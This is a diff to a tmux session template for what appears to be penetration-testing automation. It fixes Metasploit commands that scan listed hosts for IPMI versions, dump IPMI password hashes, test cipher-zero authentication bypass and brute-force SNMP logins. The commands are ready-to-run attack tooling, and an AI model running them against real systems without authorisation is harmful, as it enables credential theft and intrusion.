@@ -50,9 +50,9 @@ windows:
           - cat <%= @settings["rootDir"] %>/scans/Lists/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/snmp.lst; run"
         - IPMI Cipher Zero:
           - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
-          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file://<%= @settings["rootDir"] %>/scans/Lists/p623.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_version.txt>; run; spool off; exit'
-          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt>; run; spool off; exit'
-          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_cipher_zero.txt>; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_version.txt; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_cipher_zero.txt; run; spool off; exit'
           - wc -l <%= @settings["rootDir"] %>/scans/ipmi*
         - printers:
           - tmux select-pane -T 'printers' -t "unauthd:services.4"
